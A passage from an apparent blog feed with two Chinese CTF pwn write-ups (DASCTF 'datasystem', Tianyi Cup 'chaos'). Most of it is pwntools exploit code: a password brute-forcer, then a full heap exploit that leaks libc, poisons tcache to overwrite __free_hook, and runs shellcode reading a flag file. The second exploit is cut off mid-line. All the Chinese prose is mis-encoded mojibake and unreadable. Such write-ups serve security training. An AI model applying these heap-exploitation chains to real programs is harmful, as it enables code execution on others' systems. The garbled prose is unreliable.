src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928162959918.png" alt="image-20210928162959918"></p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928163032723.png" alt="image-20210928163032723"></p><p>ä¸€è¿›å…¥ï¼Œè¦å…ˆè¾“å…¥è´¦å·å’Œå¯†ç é€šè¿‡éªŒè¯ï¼ŒéªŒè¯é€šè¿‡æ‰èƒ½è¿›å…¥çœŸæ­£çš„æœ‰æ¼æ´çš„ç¨‹åºã€‚è´¦å·å·²ç»ç»™ï¼šadminï¼›å¯†ç è¦è‡ªå·±å»æ‰¾</p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928165344870.png" alt="image-20210928165344870"></p><p>æˆ‘å…ˆæ–­ç‚¹æ–­åœ¨æ¯”è¾ƒå‡½æ•°é‚£ï¼Œçœ‹çœ‹æœ€ç»ˆæ¯”è¾ƒçš„å€¼ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æˆ‘ä»¬è¾“å…¥çš„ï¼ˆåŸæœ¬è¾“å…¥çš„æ˜¯å…«ä¸ªaï¼‰ï¼Œç¬¬äºŒä¸ªå°±æ˜¯è¦æ¯”è¾ƒçš„å¯†ç ã€‚ç„¶åæˆ‘æŠŠä¸‹ä¸€æ¬¡è¾“å…¥çš„å€¼æ¢æˆè¿™ä¸ªå¯†ç </p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928165946197.png" alt="image-20210928165946197"></p><p>å‘ç°ï¼Œç¬¬äºŒä¸ªå‚æ•°çš„ç¬¬ä¸€ä¸ªå­—ç¬¦å˜æˆäº†0ï¼Œé‚£ä¸æ˜¯æˆªæ–­äº†å—ï¼Ÿä½†æ˜¯å¹¶æ²¡æœ‰é€šè¿‡éªŒè¯ï¼Œç„¶åæˆ‘å»cä»£ç æ•²äº†ä¸‹ï¼ŒåŸæ¥æ˜¯è¦ä¸¤ä¸ªå­—ç¬¦ä¸²åŒæ—¶éƒ½æ˜¯â€™\x00â€™æ‰ä¼šé€šè¿‡æ¯”è¾ƒï¼Œä¸€ä¸ªæ˜¯ä¸è¡Œçš„~</p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928170846837.png" alt="image-20210928170846837"></p><p>ç„¶ååˆè¯•äº†ä¸€äº›éšä¾¿è¾“å…¥çš„å¯†ç ï¼ŒæƒŠè®¶çš„å‘ç°ï¼Œå¾—åˆ°çš„éªŒè¯å¯†ç ç»“æœéƒ½æ˜¯ä¸€æ ·çš„ï¼Œåªæœ‰å¤åˆ¶çš„å¯†ç é‚£æ¬¡ä¼šå‡ºç°0ï¼Œçœ‹äº†ä¸‹wpï¼Œå¤§ä½¬æ¨æµ‹æ˜¯ä½æ•°çš„é—®é¢˜ï¼Œåªæœ‰32ä½çš„æ•°å­—æ‰èƒ½è®©å¯†ç ä¸º0ï¼Œæˆ‘è¯•äº†ä¸‹ç¡®å®æ˜¯è¿™æ ·çš„ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¯»æ‰¾ä¸€ä¸ªå¯ä»¥ä¹Ÿè®©æˆ‘ä»¬è¾“å…¥çš„å¯†ç è¢«åŠ å¯†æˆé¦–ä½æ˜¯â€™\x00â€™å°±å¯ä»¥é€šè¿‡éªŒè¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&quot;error&quot;</span><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x100</span>):<br>    c = c.to_bytes(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;big&#x27;</span>)<br>    p = process(<span class="hljs-string">&#x27;./datasystem&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;please input username: &quot;</span>, <span class="hljs-string">&quot;admin\x00&quot;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;please input password: &quot;</span>, c*<span class="hljs-number">32</span>)<br>    msg = p.recvline()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;Fail&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> msg:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;=&#x27;</span>*<span class="hljs-number">60</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;a valid char:&quot;</span>, c)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;=&#x27;</span>*<span class="hljs-number">60</span>)<br>    p.close()<br></code></pre></td></tr></table></figure><p>è¿™æ˜¯å¤§ä½¬çš„çˆ†ç ´è„šæœ¬ï¼Œæœ€ç»ˆè·å¾—ä¸¤ä¸ªå¯ä»¥é€šè¿‡çš„å€¼ï¼šâ€™câ€™å’Œâ€™\xecâ€™ã€‚ç„¶åå¤§ä½¬æ˜¯ç”¨IDAè°ƒè¯•çš„ï¼Œæˆ‘ä»¥å‰æœ‰å°è¯•è¿‡ï¼Œä½†æ˜¯æ— å¥ˆä¸€ç›´æŠ¥é”™ï¼Œä½†æ˜¯gdbè°ƒè¯•ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œæ²¡å·®</p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928171601841.png" alt="image-20210928171601841"></p><p>è¿›å…¥ä¸‹ä¸€ä¸ªç¨‹åºäº†</p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928190830374.png" alt="image-20210928190830374"></p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928190852013.png" alt="image-20210928190852013"></p><p>è¿™è¾¹v3è¿”å›å€¼å› ä¸º%sçš„ç¼˜æ•…ä¼šæŠŠbyte_50A0æŒ‡å‘çš„å­—ç¬¦å…¨éƒ¨ä½œä¸ºæ¬²å†™å…¥çš„å­—ç¬¦ï¼Œè€Œbyte_50A0å¯ä»¥æŸ¥çœ‹ï¼Œå…¨éƒ½æ˜¯aï¼Œä¼¼ä¹æœ‰0x508ä¸ªï¼Œæ‰€ä»¥è¿™è¾¹åœ¨addå†™å…¥çš„å†…å®¹æ˜¯æº¢å‡ºçš„ã€‚</p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928193027743.png" alt="image-20210928193027743"></p><p>ä¸‡äº‹å…ˆæ³„éœ²libcï¼Œè¿™è¾¹è¦å…ˆç”³è¯·å†é‡Šæ”¾ä¸€ä¸ª0x410çš„å †å—ï¼Œé˜²æ­¢è¿›å…¥tcache binä¸­ï¼Œç„¶åå†ç”³è¯·çš„å¾—æ˜¯0x8å¤§å°çš„å †å—ï¼Œå› ä¸ºsnprinfä¼šæ‰“å°ä¸ªæ•°è¿›å»ï¼Œä¸èƒ½è¶…è¿‡å…«ä¸ªï¼Œå¦åˆ™ä¼šæŠŠä¸Šé¢æ®‹ç•™çš„bkæŒ‡é’ˆç ´åï¼Œä»è€Œå¯ä»¥æ³„éœ²å‡ºlibcåœ°å€</p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928193842290.png" alt="image-20210928193842290"></p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928194236357.png" alt="image-20210928194236357"></p><p>ç„¶åå†ååºé‡Šæ”¾ä¸‰ä¸ªå †å—ï¼Œç”³è¯·å›æ¥ï¼Œå°±ä¼šè®©ä¸Šé¢çš„å †å—æ˜¯æœ€å…ˆè¢«ç”³è¯·çš„ï¼Œç„¶åé€šè¿‡æº¢å‡ºæŠŠå †å—åˆ†é…åˆ°0x23330000å†™å…¥shellcodeï¼Œä¹‹å‰å†æ¥ä¸€éæŠŠfdæŒ‡é’ˆä¸ºfree_hookï¼Œç”³è¯·è¿‡å»æ”¹ä¸ºshellcodeåœ°å€ï¼Œç„¶åé‡Šæ”¾ä¸€ä¸ªå †å—å°±ä¼šè·³è½¬æ‰§è¡Œshellcodeäº†</p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928200129108.png" alt="image-20210928200129108"></p><p>æˆåŠŸï¼</p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928203049261.png" alt="image-20210928203049261"></p><p>ä¸å®¹æ˜“ï¼Œæœ‰æœä¸€æ—¥æˆ‘è¿™å°èœé¸¡ç«Ÿç„¶èƒ½èµ›åâ€œakâ€ï¼Œæ³ªç›®ï¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./datasystem&quot;</span>)<br>libc = elf.libc<br>p = process(<span class="hljs-string">&#x27;./datasystem&#x27;</span>)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27961</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; :\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Size: \n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">&quot;what&#x27;s your Content: \n&quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; :\n&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Index:\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;Content:\n&quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; :\n&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Index:\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;Content: &quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; :\n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Index:\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>p.recvuntil(<span class="hljs-string">&quot;please input username: &quot;</span>)<br>p.send(<span class="hljs-string">&quot;admin&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;please input password: &quot;</span>)<br>p.send(<span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">0x410</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;b&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;c&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;d&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x8</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ec090</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span> + p64(<span class="hljs-number">0x71</span>) + p64(<span class="hljs-number">0x23330000</span>)<br>shellcode = asm(<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rdi, 0x23330000</span><br><span class="hljs-string">xor rsi, rsi</span><br><span class="hljs-string">mov rax, 2</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rdi, rax</span><br><span class="hljs-string">mov rsi, rsp</span><br><span class="hljs-string">mov rdx, 0x50</span><br><span class="hljs-string">xor rax, rax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rdi, 1</span><br><span class="hljs-string">mov rax, 1</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>)<br>add(<span class="hljs-number">0x60</span>, payload)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;b&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;./flag\x00&#x27;</span> + shellcode)<br><br>add(<span class="hljs-number">0x8</span>,<span class="hljs-string">&#x27;c&#x27;</span>)<br>free(<span class="hljs-number">4</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x8</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x21</span>) + p64(free_hook))<br>add(<span class="hljs-number">0x8</span>, <span class="hljs-string">&#x27;d&#x27;</span>)<br>add(<span class="hljs-number">0x8</span>, p64(<span class="hljs-number">0x23330000</span> + <span class="hljs-number">0x8</span>))<br>free(<span class="hljs-number">4</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;è¿™ä¸ªæ¯”èµ›å…¶å®æ˜¯æ²¡æŠ±ç€å¾ˆè®¤çœŸçš„æ€åº¦å»æ‰“çš„ï¼Œå¯èƒ½ç”±äºä¸€è´¯çš„å°è±¡ï¼Œä¸‹æ„è¯†è§‰å¾—å®‰æ’æœˆèµ›ï¼Œä¸æ˜¯æˆ‘è¿™ç§å°èœé¸¡èƒ½çœ‹çš„ï¼Œæ¯•ç«Ÿä»å»å¹´å¹´å°¾å­¦åˆ°ç°åœ¨ï¼Œè¿™ç§æ¯”èµ›æˆ‘éƒ½</summary>
      
    
    
    
    
    <category term="PWN" scheme="http://example.com/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>2021å¤©ç¿¼æ¯PWN</title>
    <link href="http://example.com/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/"/>
    <id>http://example.com/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/</id>
    <published>2021-09-26T01:09:37.000Z</published>
    <updated>2021-10-13T08:01:24.742Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å¤ªèœäº†ï¼Œä¸€é¢˜æ²¡å‡ºï¼›åˆæ˜¯æŠ±ç€å¤§ä½¬WPè·Ÿç€å¤ç°~</p><p>æ¥æºï¼š<a href="http://www.darry-long.top/2021/09/23/2021-%E5%A4%A9%E7%BF%BC%E6%9D%AF-pwn/">http://www.darry-long.top/2021/09/23/2021-%E5%A4%A9%E7%BF%BC%E6%9D%AF-pwn/</a></p><h2 id="chaos"><a href="#chaos" class="headerlink" title="chaos"></a>chaos</h2><p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20210926091254408.png" alt="image-20210926091254408"></p><p>å¸¸è§„checksecï¼Œ64ä½ä¿æŠ¤å…¨å¼€</p><p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20210926100956854.png" alt="image-20210926100956854"></p><p>ç¬¬ä¸€æ¬¡è¿›è¡Œæ¯”è¾ƒé•¿çš„ä»£ç å®¡è®¡ï¼Œå¯¹æˆ‘æ¥è¯´è¿˜æ˜¯æ¯”è¾ƒå›°éš¾çš„ï¼ŒåŸºæœ¬ä¸Šéƒ½æ˜¯è·Ÿç€å¤§ä½¬çš„æ³¨é‡Šè¾¹å†™è¾¹è€ƒè™‘é€»è¾‘</p><p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20210926101234190.png" alt="image-20210926101234190"></p><p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20210926101445271.png" alt="image-20210926101445271"></p><p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20210926110301065-16326298376511.png" alt="image-20210926110301065"></p><p>è¿™ä¿å­˜çš„æ˜¯ä¸€ä¸ªå•é“¾è¡¨ç»“æ„ï¼Œåœ¨æ¯ä¸ªç”³è¯·å‡ºæ¥çš„å †å—ä¸Šçš„0x210ä¿å­˜åœ¨å‰ä¸€ä¸ªå †å—çš„åœ°å€ï¼Œåœ¨0x208å¤„ä¿å­˜ç€å½“å‰å †å—å¯å†™å…¥çš„æ•°æ®çš„é•¿åº¦ï¼Œæ‰€ä»¥æ˜¯å­˜åœ¨å †æº¢å‡ºçš„ï¼Œä¿®æ”¹äº†sizeå°±å¯ä»¥ä¿®æ”¹ä¿å­˜å †å—çš„åœ°å€ï¼Œå˜æˆä»»æ„åœ°å€å†™æˆ–è€…ä¿®æ”¹ä¸‹ä¸€å—å †å—çš„å †å¤´ã€fd\bkæŒ‡é’ˆç­‰ã€‚å› ä¸ºæ˜¯å•å‘é“¾è¡¨ç»“æ„ï¼Œæ‰€ä»¥æ˜¯ä¸€ä¸ªä¸€ä¸ªè¿½æº¯çš„ï¼Œè¶Šæ™šç”³è¯·çš„å †å—åºå·è¶Šé å‰ï¼Œä½†æ˜¯åœ¨å †ä¸Šçš„åœ°å€å…¶å®æ˜¯é åçš„</p><p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20210926121301503.png" alt="image-20210926121301503"></p><p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20210926121807097.png" alt="image-20210926121807097"></p><p>æœ€ç»ˆåœ¨æˆ‘æœ¬åœ°è°ƒä¸ºç¬¦åˆone_gadgetçš„ç¯å¢ƒè¦æ±‚ï¼Œå¯æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆæœ€ç»ˆå´æ²¡æœ‰getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./chall&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc-2.27.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc-2.23.so&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/ld-2.27.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&quot;&quot;,)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>p.send(<span class="hljs-string">&quot;opcode:1\npasswd:Cr4at31\n\r\r\n&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>p.send(<span class="hljs-string">&quot;opcode:3\npasswd:Ed1t1\n\r\r\n&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>p.send(<span class="hljs-string">&quot;opcode:2\npasswd:SH0w1\n\r\r\n&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>p.send(<span class="hljs-string">&quot;opcode:4\npasswd:D3l4te1\n\r\r\n&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x4f3d5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rsp &amp; 0xf == 0</span><br><span class="hljs-string">  rcx == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4f432 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x40] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x10a41c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>add(<span class="hljs-number">0x208</span>, <span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">0x208</span>)<br>add(<span class="hljs-number">0x208</span>, <span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x208</span>)<br>add(<span class="hljs-number">0x208</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x208</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x208</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x4c0</span><br>log.info(<span class="hljs-string">&quot;heap_addr==&gt;0x%x&quot;</span> %heap_addr)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>add(<span class="hljs-number">0x208</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x208</span>) <span class="hljs-comment">#æ–°ç”³è¯·çš„ä¸º0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x208</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x208</span>) <span class="hljs-comment">#0</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span 